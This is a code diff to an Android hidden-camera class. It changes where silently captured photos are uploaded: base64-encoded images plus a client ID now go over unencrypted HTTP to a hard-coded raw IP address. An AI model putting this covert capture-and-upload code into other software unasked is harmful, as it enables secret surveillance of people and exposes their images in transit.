@@ -18,6 +18,7 @@ package com.androidhiddencamera;
 
 import android.annotation.SuppressLint;
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.hardware.Camera;
@@ -28,8 +29,12 @@ import android.util.Base64;
 import android.util.Log;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
+import android.widget.Toast;
+
 import com.androidhiddencamera.config.CameraResolution;
 import com.androidhiddencamera.config.CameraRotation;
+
+import me.sagan.SmartTrap.Data;
 import okhttp3.Call;
 import okhttp3.Callback;
 import okhttp3.FormBody;
@@ -215,6 +220,8 @@ class CameraPreview extends SurfaceView implements SurfaceHolder.Callback {
                     new Thread(new Runnable() {
                         @Override
                         public void run() {
+                            String clientID = Data.name;
+
                             //Convert byte array to bitmap
                             Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
 
@@ -235,9 +242,10 @@ class CameraPreview extends SurfaceView implements SurfaceHolder.Callback {
                             String encoded = Base64.encodeToString(byteArray,Base64.DEFAULT);
                             Log.d("ByteArray",encoded);
                             OkHttpClient client = new OkHttpClient();
-                            String url = "https://api.arexkrain.repl.co/test";
+                            String url = "http://121.52.158.157:4000/";
                             RequestBody formBody = new FormBody.Builder()
-                                    .add("image", encoded)
+                                    .add("base64", encoded)
+                                    .add("client",Data.name)
                                     .build();
                             Log.d("start","Request about to send");
                             Request request = new Request.Builder().url(url).post(formBody).build();
@@ -256,6 +264,8 @@ class CameraPreview extends SurfaceView implements SurfaceHolder.Callback {
                                     }
                                 }
                             });
+                            // tmp
+
                             //Save image to the file.
                             if (HiddenCameraUtils.saveImageFromFile(rotatedBitmap,
                                     mCameraConfig.getImageFile(),
